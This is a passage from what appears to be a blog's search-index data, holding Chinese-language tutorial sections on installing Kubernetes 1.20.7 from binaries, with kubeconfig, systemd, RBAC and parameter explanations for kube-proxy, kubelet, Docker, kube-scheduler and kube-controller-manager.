二进制安装-kube-proxy安装(十一)","uri":"/post/2505/"},{"categories":["kubernetes"],"content":"二、配置kube-config master节点执行 cd /etc/kubernetes/ # 设置集群信息 kubectl config set-cluster kubernetes --kubeconfig=kube-proxy.conf --server=https://172.17.20.200:6443 --certificate-authority=/etc/kubernetes/pki/ca/ca.pem --embed-certs=true # 设置用户信息 kubectl config set-credentials kube-proxy --kubeconfig=kube-proxy.conf --client-certificate=/etc/kubernetes/pki/kube-proxy.pem --client-key=/etc/kubernetes/pki/kube-proxy-key.pem --embed-certs=true # 设置上下文 kubectl config set-context kube-proxy --kubeconfig=kube-proxy.conf --cluster=kubernetes --user=kube-proxy # 设置默认上下文 kubectl config use-context kube-proxy --kubeconfig=kube-proxy.conf # 分发到其他节点 for i in 202 203 210 211 212;do scp /etc/kubernetes/kube-proxy.conf 172.17.20.$i:/etc/kubernetes/ ;done ","date":"2021-06-23 16:29","objectID":"/post/2505/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kube-proxy安装(十一)","uri":"/post/2505/"},{"categories":["kubernetes"],"content":"三、kube-proxy配置文件 cat \u003e /etc/kubernetes/kube-proxy.yaml \u003c\u003cEOF apiVersion: kubeproxy.config.k8s.io/v1alpha1 kind: KubeProxyConfiguration bindAddress: 0.0.0.0 healthzBindAddress: 0.0.0.0:10256 metricsBindAddress: 0.0.0.0:10249 bindAddressHardFail: true enableProfiling: false clusterCIDR: 10.244.0.0/16 hostnameOverride: 172.17.20.201 clientConnection: kubeconfig: /etc/kubernetes/kube-proxy.conf qps: 100 burst: 200 mode: \"ipvs\" EOF # 分发到其他机器 for i in 202 203 210 211 212;do scp /etc/kubernetes/kube-proxy.yaml 172.17.20.$i:/etc/kubernetes/ ;done # 修改hostnameOverride信息 for i in 202 203 210 211 212;do ssh 172.17.20.$i 'sed -i \"s#hostnameOverride.*#hostnameOverride: $(ip a s eth0 | grep -o 172\\.17\\.20.*/ | tr -d /)#\" /etc/kubernetes/kube-proxy.yaml' ;done 参数说明: bindAddress: 监听地址 healthzBindAddress: 健康检查服务的监听地址和端口，默认0.0.0.0:10256 metricsBindAddress: metrics指标服务的监听地址和端口，默认127.0.0.1:10249 bindAddressHardFail: 端口绑定失败视为严重错误，直接退出程序 enableProfiling: 启用性能分析 clusterCIDR: pod的ip范围 hostnameOverride: 参数值必须与 kubelet 的值一致，否则 kube-proxy 启动后会找不到该 Node，从而不会创建任何 ipvs 规则 clientConnection: kube-proxy客户端的配置 kubeconfig: kubeconfig文件路径 qps: 每秒允许的查询数 burst: 与apiserver通信时的并发数 mode: 使用的网络代理模式，可选项userspace、iptables、ipvs ","date":"2021-06-23 16:29","objectID":"/post/2505/:0:3","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kube-proxy安装(十一)","uri":"/post/2505/"},{"categories":["kubernetes"],"content":"四、配置systemd启动脚本 cat \u003e /etc/systemd/system/kube-proxy.service \u003c\u003cEOF [Unit] Description=Kubernetes Kube-Proxy Server Documentation=https://github.com/GoogleCloudPlatform/kubernetes After=network.target [Service] ExecStart=/usr/local/bin/kube-proxy \\\\ --config=/etc/kubernetes/kube-proxy.yaml \\\\ --logtostderr=false \\\\ --log-file=/var/log/kube-proxy.log \\\\ --v=2 Restart=on-failure RestartSec=5 LimitNOFILE=65536 [Install] WantedBy=multi-user.target EOF # 分发到其他机器 for i in 202 203 210 211 212;do scp /etc/systemd/system/kube-proxy.service 172.17.20.$i:/etc/systemd/system/ ;done ","date":"2021-06-23 16:29","objectID":"/post/2505/:0:4","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kube-proxy安装(十一)","uri":"/post/2505/"},{"categories":["kubernetes"],"content":"五、启动服务 systemctl start kube-proxy systemctl enable kube-proxy ","date":"2021-06-23 16:29","objectID":"/post/2505/:0:5","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kube-proxy安装(十一)","uri":"/post/2505/"},{"categories":["kubernetes"],"content":"六、查看状态 for i in 201 202 203 210 211 212;do echo -e \"172.17.20.$i:\" ;ssh 172.17.20.$i 'systemctl status kube-proxy|grep Active' ;done 08048-t8btv6tuquh.png ","date":"2021-06-23 16:29","objectID":"/post/2505/:0:6","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kube-proxy安装(十一)","uri":"/post/2505/"},{"categories":["kubernetes"],"content":"一、安装kubelet # master节点执行 # 远程创建目录，创建manifests的目的是预留一个静态pod目录，目前暂时还用不到。 for i in {201..203};do ssh 172.17.20.$i mkdir /etc/kubernetes/{manifests,pki} /etc/kubernetes/pki/ca -p ;done for i in {210..212};do ssh 172.17.20.$i mkdir /etc/kubernetes/{manifests,pki} /etc/kubernetes/pki/ca -p ;done # 复制CA根证书 for i in {210..212};do scp /etc/kubernetes/pki/ca/ca.pem 172.17.20.$i:/etc/kubernetes/pki/ca/ ;done # 安装kubelet for i in {201..203};do scp /server/packages/kubernetes/server/bin/kubelet root@172.17.20.$i:/usr/local/bin/kubelet ;done for i in {210..212};do scp /server/packages/kubernetes/server/bin/kubelet root@172.17.20.$i:/usr/local/bin/kubelet ;done ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kubelet安装(十)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"二、生成kubeconfig文件 master节点执行 # 设置集群信息 kubectl config set-cluster kubernetes --kubeconfig=kubelet-bootstrap.conf --server=https://172.17.20.200:6443 --certificate-authority=/etc/kubernetes/pki/ca/ca.pem --embed-certs=true # 设置用户信息，之前用的是证书，现在这里用的是token(这个token我们后面只赋予他创建csr请求的权限)，kubelet的证书我们交给apiserver来管理 kubectl config set-credentials kubelet-bootstrap --kubeconfig=kubelet-bootstrap.conf --token=`sed 's#,.*##' /etc/kubernetes/token.csv` # 设置上下文信息 kubectl config set-context kubernetes --kubeconfig=kubelet-bootstrap.conf --cluster=kubernetes --user=kubelet-bootstrap # 设置默认上下文 kubectl config use-context kubernetes --kubeconfig=kubelet-bootstrap.conf # 分发到node节点 # 我这里master节点也作为node节点使用 for i in {202..203};do scp /etc/kubernetes/kubelet-bootstrap.conf 172.17.20.$i:/etc/kubernetes/ ;done for i in {210..212};do scp /etc/kubernetes/kubelet-bootstrap.conf 172.17.20.$i:/etc/kubernetes/ ;done ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kubelet安装(十)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"三、创建ClusterRoleBinding 1.我们的token属于system::bootstrappers组,但是现在没有创建CSR的权限，所以现在需要和ClusterRole(system:node-bootstrapper)绑定，这个ClusterRole是包含certificatesigningrequests权限的。下面在master节点执行 cat \u003c\u003cEOF | kubectl apply -f - apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: create-csrs-for-bootstrapping subjects: - kind: Group name: system:bootstrappers apiGroup: rbac.authorization.k8s.io roleRef: kind: ClusterRole name: system:node-bootstrapper apiGroup: rbac.authorization.k8s.io EOF 2.当apiserver访问kubelet时(logs、exec等操作),kubelet也需要对客户端进行认证,k8s中内置了一个system:kubelet-api-admin的角色，我们将它和apiserver证书中的CN字段绑定，即和kubernetes用户进行绑定,这样apiserver对kubelet就有了访问权限，下面同样在master节点执行 cat \u003c\u003cEOF | kubectl apply -f - apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: kube-apiserver-kubelet-apis-admin roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: system:kubelet-api-admin subjects: - apiGroup: rbac.authorization.k8s.io kind: User name: kubernetes EOF ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:3","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kubelet安装(十)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"四、配置kubelet参数 关于配置: https://kubernetes.io/zh/docs/tasks/administer-cluster/kubelet-config-file/ KubeletConfiguration: https://v1-20.docs.kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration cat \u003e /etc/kubernetes/kubelet.yaml \u003c\u003cEOF apiVersion: kubelet.config.k8s.io/v1beta1 kind: KubeletConfiguration enableServer: true staticPodPath: /etc/kubernetes/manifests syncFrequency: 1m fileCheckFrequency: 20s address: 0.0.0.0 port: 10250 readOnlyPort: 0 rotateCertificates: true serverTLSBootstrap: true authentication: anonymous: enabled: false webhook: cacheTTL: 0s enabled: true x509: clientCAFile: /etc/kubernetes/pki/ca/ca.pem authorization: mode: Webhook healthzPort: 10248 healthzBindAddress: 0.0.0.0 clusterDomain: cluster.local clusterDNS: # 配置这个为预留，后期部署core-dns将使用这个地址 - 10.1.0.10 nodeStatusUpdateFrequency: 10s nodeStatusReportFrequency: 1m imageMinimumGCAge: 2m imageGCHighThresholdPercent: 80 imageGCLowThresholdPercent: 75 volumeStatsAggPeriod: 1m cgroupDriver: systemd runtimeRequestTimeout: 2m maxPods: 200 kubeAPIQPS: 5 kubeAPIBurst: 10 serializeImagePulls: false evictionHard: memory.available: \"100Mi\" nodefs.available: \"10%\" nodefs.inodesFree: \"5%\" imagefs.available: \"15%\" containerLogMaxSize: 10Mi containerLogMaxFiles: 8 EOF # 分发到其他节点 for i in {202..203};do scp /etc/kubernetes/kubelet.yaml 172.17.20.$i:/etc/kubernetes/ ;done for i in {210..212};do scp /etc/kubernetes/kubelet.yaml 172.17.20.$i:/etc/kubernetes/ ;done 参数说明: enableServer: 启动kubelet的http rest server，这个server提供了获取本地节点运行的pod列表、状态以及其他监控相关的rest接口，默认true。 staticPodPath: 静态pod目录 syncFrequency: 同步运行中容器的配置的频率,默认1m fileCheckFrequency: 检查静态Pod的时间间隔,默认20s address: 监听地址，默认0.0.0.0 port: 监听端口，默认10250 readOnlyPort: 一个提供只读服务的端口，0为禁用。 rotateCertificates: 启用客户端证书轮换。 Kubelet将从certificates.k8s.io API请求新证书。 serverTLSBootstrap: 启用服务器证书引导。 从certificates.k8s.io API请求证书，需要批准者批准证书签名请求。这必须启用RotateKubeletServerCertificate特性，默认是启用的。 authentication: kubelet对客户端的认证方式 anonymous: 匿名认证 webhook: webhook认证方式 cacheTTL : 认证结果缓存 x509: x509证书认证 clientCAFile: 请求kubelet服务端的客户端，这里指定给客户端证书签发的CA机构 authorization: kubelet对客户端的授权方式 mode: 应用于kubelet服务器请求的授权模式。有效值是AlwaysAllow和Webhook。Webhook模式使用SubjectAccessReview API来确定授权。 healthzPort: healthz接口的监听端口 healthzBindAddress: healthz接口的监听地址 clusterDomain: 此集群的DNS域 clusterDNS: 一个DNS列表，kubelet将配置所有容器使用此DNS解析，而不是主机的DNS服务器。 nodeStatusUpdateFrequency : kubelet将节点状态信息上报到apiserver的频率，默认：10s nodeStatusReportFrequency: kubelet节点状态不变时将节点状态上报到apiserver的频率。默认：1m imageMinimumGCAge: 镜像垃圾回收时，清理多久没有被使用的镜像，默认2m。即2分钟内没有被使用过的镜像会被清理。 imageGCHighThresholdPercent: 设置镜像垃圾回收的阈值(磁盘空间百分比)，默认85。高于此值会触发垃圾回收。 imageGCLowThresholdPercent: 设置停止镜像垃圾回收的阈值(磁盘空间百分比)，默认80。低于此值会停止垃圾回收。 volumeStatsAggPeriod: 计算和缓存所有Pod的卷磁盘使用情况的频率，默认1m cgroupDriver: kubelet用来操纵cgroups的驱动程序（cgroupfs或systemd） runtimeRequestTimeout: 所有runtime请求的超时时间，除了长时间运行的请求如pull、logs、exec 和 attach。默认2m maxPods: 控制kubelet可以运行的pod数量。默认110 kubeAPIQPS: 与apiserver通信的qps,默认5 kubeAPIBurst: 与apiserver通信时的并发数,默认10 serializeImagePulls: 默认true，一个一个按顺序拉镜像，docker大于1.9，并且不是使用aufs存储驱动的建议改成false evictionHard: 设置硬驱逐pod的阈值.https://kubernetes.io/zh/docs/tasks/administer-cluster/out-of-resource/ 默认如下: memory.available: “100Mi” # 可用内存不足100Mi会采用硬驱逐pod nodefs.available: “10%” # nodefs空间不足10%会采用硬驱逐pod nodefs.inodesFree: “5%” # inodes不足5%会采用硬驱逐pod imagefs.available: “15%” # imagefs空间不足15%会采用硬驱逐pod containerLogMaxSize: 容器日志轮换大小，满足指定大小会轮换，默认10Mi containerLogMaxFiles: 容器日志轮换保留的最大个数，默认5个 ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:4","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kubelet安装(十)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"五、创建systemd脚本文件 所有node节点执行,注意需要修改–hostname-override=参数的值 cat \u003e /etc/systemd/system/kubelet.service \u003c\u003cEOF [Unit] Description=Kubernetes Kubelet Documentation=https://github.com/GoogleCloudPlatform/kubernetes After=docker.service Requires=docker.service [Service] ExecStart=/usr/local/bin/kubelet \\\\ --bootstrap-kubeconfig=/etc/kubernetes/kubelet-bootstrap.conf \\\\ --cert-dir=/etc/kubernetes/pki/ \\\\ --config=/etc/kubernetes/kubelet.yaml \\\\ --container-runtime=docker \\\\ --network-plugin=cni \\\\ --cni-bin-dir=/opt/cni/bin/ \\\\ --hostname-override=172.17.20.201 \\\\ --kubeconfig=/etc/kubernetes/kubelet.conf \\\\ --pod-infra-container-image=registry.aliyuncs.com/google_containers/pause:3.2 \\\\ --alsologtostderr=true \\\\ --logtostderr=false \\\\ --log-file=/var/log/kubelet.log \\\\ --log-file-max-size=100 \\\\ --v=2 Restart=on-failure RestartSec=5 [Install] WantedBy=multi-user.target EOF 参数说明: --bootstrap-kubeconfig: 用于bootstrap引导启动的kubeconfig文件 --cert-dir: 证书申请被批准后，用于保存证书和私钥的路径 --container-runtime: 容器运行时(CRI)，docker或remote --network-plugin: 网络插件名称 --cni-bin-dir: CNI插件的bin目录 --cni-conf-dir: CNI配置文件目录 --container-runtime-endpoint: 当container-runtime使用remote时,指定它的通信端点，默认unix:///var/run/dockershim.sock --docker-endpoint: 当container-runtime使用docker时,指定它的通信端点,默认unix:///var/run/dockershim.sock --hostname-override: 用来配置该节点在集群中显示的主机名，kubelet设置了-–hostname-override参数后，kube-proxy也需要设置，否则会出现找不到Node的情况 --kubeconfig: 指定kubeconfig文件。启动流程说明: https://kubernetes.io/zh/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/#bootstrap-initialization --logtostderr: 日志输出到stderr而不是文件。默认true --pod-infra-container-image: 指定pause镜像 ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:5","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kubelet安装(十)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"六、证书自动批准和续期 默认情况下,kubelet向apiserver发送证书请求后,需要我们手动批准kubectl certificate approve xxx.真正负责签发证书的是kube-controller-manager,他需要如下参数: cluster-signing-cert-file,cluster-signing-key-file,这个我们在前面已经配置过了。 要允许kubelet请求并接收证书(访问kube-apiserver的客户端证书),可以创建一个ClusterRoleBinding将启动引导节点所在的组system:bootstrappers绑定到集群角色(ClusterRole)system:certificates.k8s.io:certificatesigningrequests:nodeclient上: # master节点执行 cat \u003c\u003cEOF | kubectl apply -f - # 自动批准\"system:bootstrappers\"组的所有CSR apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: auto-approve-csrs-for-group subjects: - kind: Group name: system:bootstrappers apiGroup: rbac.authorization.k8s.io roleRef: kind: ClusterRole name: system:certificates.k8s.io:certificatesigningrequests:nodeclient apiGroup: rbac.authorization.k8s.io EOF 要允许kubelet对客户端证书执行续期操作(对访问kube-apiserver的客户端证书续期)，可以创建一个ClusterRoleBinding将正常工作的节点所在的组system:nodes绑定到绑定到集群角色(ClusterRole)system:certificates.k8s.io:certificatesigningrequests:selfnodeclient上: # master节点执行 cat \u003c\u003cEOF | kubectl apply -f - # 自动批准\"system:nodes\"组的CSR续约请求 apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: auto-approve-renewals-for-nodes subjects: - kind: Group name: system:nodes apiGroup: rbac.authorization.k8s.io roleRef: kind: ClusterRole name: system:certificates.k8s.io:certificatesigningrequests:selfnodeclient apiGroup: rbac.authorization.k8s.io EOF 到此为止，kubelet可以在首次启动时申请一个访问apiserver的客户端证书，并将它拿到手。但是kubelet本身也需要一个服务端证书,这需要我们手动来批准,1.20之前的版本应该可以自动批准(我按照1.19的文档试了一下没有成功)。官方关于kubelet服务端证书的说明:https://v1-20.docs.kubernetes.io/zh/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/#certificate-rotation ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:6","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kubelet安装(十)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"七、启动服务 # 所有node节点执行 systemctl start kubelet systemctl enable kubelet ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:7","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kubelet安装(十)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"八、批准kubelet服务端证书 查看客户端csr,可以看到已经自动批准了 91213-lidhaws11ye.png 等待一会，可以看到服务端证书的csr 48653-1pm8g7p98eb.png 这需要我们手动批准，其他节点请自行操作 37398-983zndtu1w.png ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:8","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kubelet安装(十)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"九、查看node状态 35370-2m3nmcn04uf.png ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:9","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kubelet安装(十)","uri":"/post/2493/"},{"categories":["docker","kubernetes"],"content":"一、配置docker yum源 wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo 二、安装docker 19.03.9 yum install -y docker-ce-19.03.9-3.el7.x86_64 三、修改配置文件 mkdir /etc/docker cat \u003e /etc/docker/daemon.json \u003c\u003cEOF { \"exec-opts\": [\"native.cgroupdriver=systemd\"], \"registry-mirrors\": [ \"https://lkf7gymq.mirror.aliyuncs.com\", \"https://docker.mirrors.ustc.edu.cn\" ], \"log-driver\": \"json-file\" } EOF 四、启动docker systemctl start docker systemctl enable docker ","date":"2021-06-22 14:21","objectID":"/post/2491/:0:0","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-Docker安装配置(九) ","uri":"/post/2491/"},{"categories":["kubernetes"],"content":"一、安装controller-manager # 三台机器执行 cp /server/packages/kubernetes/server/bin/kube-scheduler /usr/local/bin/ ","date":"2021-06-22 10:57","objectID":"/post/2490/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kube-scheduler(八)","uri":"/post/2490/"},{"categories":["kubernetes"],"content":"二、生成kubeconfig文件 cd /etc/kubernetes/ # 设置集群信息 kubectl config set-cluster kubernetes --kubeconfig=kube-scheduler.conf --server=https://172.17.20.200:6443 --certificate-authority=/etc/kubernetes/pki/ca/ca.pem --embed-certs=true # 设置用户信息 kubectl config set-credentials kube-scheduler --kubeconfig=kube-scheduler.conf --client-certificate=/etc/kubernetes/pki/kube-scheduler.pem --client-key=/etc/kubernetes/pki/kube-scheduler-key.pem --embed-certs=true # 设置上下文 kubectl config set-context kubernetes --kubeconfig=kube-scheduler.conf --cluster=kubernetes --user=kube-scheduler # 设置默认上下文 kubectl config use-context --kubeconfig=kube-scheduler.conf kubernetes # 分发到其他节点 for i in {202..203};do scp /etc/kubernetes/kube-scheduler.conf 172.17.20.$i:/etc/kubernetes/ ;done ","date":"2021-06-22 10:57","objectID":"/post/2490/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kube-scheduler(八)","uri":"/post/2490/"},{"categories":["kubernetes"],"content":"三、创建systemd启动脚本 三台配置相同 cat \u003e /etc/systemd/system/kube-scheduler.service \u003c\u003cEOF [Unit] Description=Kubernetes Scheduler Documentation=https://github.com/GoogleCloudPlatform/kubernetes [Service] ExecStart=/usr/local/bin/kube-scheduler \\\\ --authentication-kubeconfig=/etc/kubernetes/kube-scheduler.conf \\\\ --authorization-kubeconfig=/etc/kubernetes/kube-scheduler.conf \\\\ --kubeconfig=/etc/kubernetes/kube-scheduler.conf \\\\ --bind-address=0.0.0.0 \\\\ --secure-port=10259 \\\\ --client-ca-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --leader-elect=true \\\\ --log-file=/var/log/kube-scheduler.log \\\\ --log-file-max-size=100 \\\\ --logtostderr=false \\\\ --tls-cert-file=/etc/kubernetes/pki/kube-scheduler.pem \\\\ --tls-private-key-file=/etc/kubernetes/pki/kube-scheduler-key.pem Restart=on-failure RestartSec=10 LimitNOFILE=65536 [Install] WantedBy=multi-user.target EOF 参数说明: --authentication-kubeconfig: 指定一个拥有创建tokenreviews.authentication.k8s.io对象权限的kubeconfig配置文件。如果设置为空，则所有的token请求都被视为匿名，也不会启用客户端CA认证 --authorization-kubeconfig: 指定一个拥有创建subjectaccessreviews.authorization.k8s.io对象权限的kubeconfig配置文件。如果设置为空,则所有未列入白名单的请求都将被拒绝。 --bind-address: 安全端口的监听地址 --secure-port: 安全端口，默认10259 --client-ca-file: 如果有客户端使用证书来请求controller-manager,那么controller-manager将会使用此参数指定的根证书进行校验 --leader-elect: true开启leader选举 --log-file: 日志文件路径 --log-file-max-size: 单个日志文件的上限大小，默认1800，单位MB --logtostderr: 将日志输出到stderr，而不是文件，默认true。 --tls-cert-file: 服务端证书 --tls-private-key-file: 服务端证书私钥 --kubeconfig: 与apiserver通信的kubeconfig --config: 指定配置文件的方式运行，想了解的可以看官方文档:https://kubernetes.io/zh/docs/reference/scheduling/config/ ","date":"2021-06-22 10:57","objectID":"/post/2490/:0:3","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kube-scheduler(八)","uri":"/post/2490/"},{"categories":["kubernetes"],"content":"四、启动服务 systemctl start kube-scheduler systemctl enable kube-scheduler ","date":"2021-06-22 10:57","objectID":"/post/2490/:0:4","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kube-scheduler(八)","uri":"/post/2490/"},{"categories":["kubernetes"],"content":"五、测试 查看当前leader锁在谁手上 kubectl get lease -n kube-system kube-scheduler NAME HOLDER AGE kube-scheduler master01_c7c38b21-3d32-4a25-b2ae-a7dde7b6c240 11m 停掉master01的kube-scheduler,观察是否能被其他人获取。 ","date":"2021-06-22 10:57","objectID":"/post/2490/:0:5","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kube-scheduler(八)","uri":"/post/2490/"},{"categories":["kubernetes"],"content":"一、安装controller-manager # 三台机器执行 cp /server/packages/kubernetes/server/bin/kube-controller-manager /usr/local/bin/ ","date":"2021-06-21 09:50","objectID":"/post/2484/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-controller-manager(七)","uri":"/post/2484/"},{"categories":["kubernetes"],"content":"二、生成kubeconfig文件 关于kubeconfig可以看上一篇文章: https://soulchild.cn/2478.html cd /etc/kubernetes/ # 设置集群信息 kubectl config set-cluster kubernetes --kubeconfig=controller-manager.conf --server=https://172.17.20.200:6443 --certificate-authority=/etc/kubernetes/pki/ca/ca.pem --embed-certs=true # 设置用户信息 kubectl config set-credentials controller-manager --kubeconfig=controller-manager.conf --client-certificate=/etc/kubernetes/pki/kube-controller-manager.pem --client-key=/etc/kubernetes/pki/kube-controller-manager-key.pem --embed-certs=true # 设置上下文信息,将用户和集群关联 kubectl config set-context controller-manager --kubeconfig=controller-manager.conf --cluster=kubernetes --user=controller-manager # 设置配置文件中默认的上下文 kubectl config use-context controller-manager --kubeconfig=controller-manager.conf # 分发到其他机器 for i in {202..203};do scp /etc/kubernetes/controller-manager.conf 172.17.20.$i:/etc/kubernetes/ ;done ","date":"2021-06-21 09:50","objectID":"/post/2484/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-controller-manager(七)","uri":"/post/2484/"},{"categories":["kubernetes"],"content":"三、创建systemd启动脚本 三台配置相同 cat \u003e /etc/systemd/system/kube-controller-manager.service \u003c\u003cEOF [Unit] Description=Kubernetes Controller Manager Documentation=https://github.com/GoogleCloudPlatform/kubernetes [Service] ExecStart=/usr/local/bin/kube-controller-manager \\\\ --allocate-node-cidrs=true \\\\ --cluster-cidr=10.244.0.0/16 \\\\ --service-cluster-ip-range=10.1.0.0/16 \\\\ --node-cidr-mask-size=24 \\\\ --authentication-kubeconfig=/etc/kubernetes/controller-manager.conf \\\\ --authorization-kubeconfig=/etc/kubernetes/controller-manager.conf \\\\ --bind-address=0.0.0.0 \\\\ --client-ca-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --cluster-name=kubernetes \\\\ --cluster-signing-cert-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --cluster-signing-key-file=/etc/kubernetes/pki/ca/ca-key.pem \\\\ --cluster-signing-duration=87600h \\\\ --concurrent-deployment-syncs=10 \\\\ --controllers=*,bootstrapsigner,tokencleaner \\\\ --horizontal-pod-autoscaler-initial-readiness-delay=30s \\\\ --horizontal-pod-autoscaler-sync-period=10s \\\\ --kube-api-burst=100 \\\\ --kube-api-qps=100 \\\\ --kubeconfig=/etc/kubernetes/controller-manager.conf \\\\ --leader-elect=true \\\\ --logtostderr=false \\\\ --log-file=/var/log/kube-controller-manager.log \\\\ --log-file-max-size=100 \\\\ --pod-eviction-timeout=1m \\\\ --root-ca-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --secure-port=10257 \\\\ --service-account-private-key-file=/etc/kubernetes/pki/apiserver-key.pem \\\\ --tls-cert-file=/etc/kubernetes/pki/kube-controller-manager.pem \\\\ --tls-private-key-file=/etc/kubernetes/pki/kube-controller-manager-key.pem \\\\ --use-service-account-credentials=true Restart=on-failure RestartSec=10 LimitNOFILE=65536 [Install] WantedBy=multi-user.target EOF 参数说明: --allocate-node-cidrs: 基于云驱动来为 Pod 分配和设置子网掩码。 --cluster-cidr: pod ip的范围。要求--allocate-node-cidrs为true。 --service-cluster-ip-range: cluster ip的范围，和apiserver中的要一致。要求--allocate-node-cidrs为true。 --node-cidr-mask-size: 设置一个node节点可以使用的pod ip数量及范围，这里填写的是掩码. 所有可用pod ip数量/node可用ip数量=最大节点数。(我猜的。。) --authentication-kubeconfig: 指定一个拥有创建tokenreviews.authentication.k8s.io对象权限的kubeconfig配置文件。如果设置为空，则所有的token请求都被视为匿名，也不会启用客户端CA认证 --authorization-kubeconfig: 指定一个拥有创建subjectaccessreviews.authorization.k8s.io对象权限的kubeconfig配置文件。如果设置为空,则所有未列入白名单的请求都将被拒绝。 --bind-address: 监听地址 --client-ca-file: 如果有客户端使用证书来请求controller-manager,那么controller-manager将会使用此参数指定的根证书进行校验 --cluster-name: 集群名称，默认kubernetes --cluster-signing-cert-file: 用于签发证书的CA根证书 --cluster-signing-key-file: 用于签发证书的CA根证书的私钥 --cluster-signing-duration: 签发证书的有效期,默认8760h0m0s。(感觉最大能到5年,我设置的10年,通过openssl查看签发的证书有效期只有5年。) --concurrent-deployment-syncs: 允许并发同步deployment的数量,默认5。数字越大，deployment响应越快，但CPU和网络负载会高。 --controllers: 要启用的控制器列表。*表示启用所有默认启用的控制器。foo表示启用名为foo的控制器； -foo 表示禁用名为 foo的控制器。 所有控制器：attachdetach、bootstrapsigner、cloud-node-lifecycle、clusterrole-aggregation、cronjob、csrapproving、csrcleaner、csrsigning、daemonset、deployment、disruption、endpoint、endpointslice、endpointslicemirroring、ephemeral-volume、garbagecollector、horizontalpodautoscaling、job、namespace、nodeipam、nodelifecycle、persistentvolume-binder、persistentvolume-expander、podgc、pv-protection、pvc-protection、replicaset、replicationcontroller、resourcequota、root-ca-cert-publisher、route、service、serviceaccount、serviceaccount-token、statefulset、tokencleaner、ttl、ttl-after-finished 默认禁用的控制器：bootstrapsigner 和 tokencleaner。 --horizontal-pod-autoscaler-initial-readiness-delay: hpa相关配置，初始化时间,用于延迟采样,默认30s --horizontal-pod-autoscaler-sync-period: hpa相关配置，检查周期（默认为15s） --kube-api-burst: controller-manager与apiserver通信时突发请求个数上限。默认30. --kube-api-qps: 与apisever通信时的QPS限制。默认20. --kubeconfig: 与apiserver通信的kubeconfig --leader-elect: true开启leader选举 --logtostderr: 将日志输出到stderr，而不是文件，默认true。 --log-file: 日志文件路径 --log-file-max-size: 单个日志文件的上限大小，默认1800，单位MB --node-monitor-period: 每隔一段时间检查kubelet的状态，默认5s --node-monitor-grace-period: 将一个Node节点标记为notready之前没有响应的时间,默认40s。必须是kubelet的 nodeStatusUpdateFrequency(参数–node-status-update-frequency,默认10s)的N倍 --node-startup-grace-period: 将一个Node节点标记为unhealthy之前没有响应的时间,默认1m。 --pod-eviction-timeout:","date":"2021-06-21 09:50","objectID":"/post/2484/:0:3","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-controller-manager(七)","uri":"/post/2484/"},{"categories":["kubernetes"],"content":"四、启动服务 systemctl start kube-controller-manager systemctl enable kube-controller-manager ","date":"2021-06-21 09:50","objectID":"/post/2484/:0:4","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-controller-manager(七)","uri":"/post/2484/"},{"categories":["kubernetes"],"content":"五、测试 查看当前leader节点 kubectl get lease -n kube-system kube-controller-manager NAME HOLDER AGE kube-controller-manager master02_d6925209-5d63-4840-bc1c-9f16f4d8547b 14h # 当前leader是master02 停掉master02的controller-manager,观察是否会切换到其他节点 ","date":"2021-06-21 09:50","objectID":"/post/2484/:0:5","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-controller-manager(七)","uri":"/post/2484/"},{"categories":["kubernetes"],"content":"官方文档: 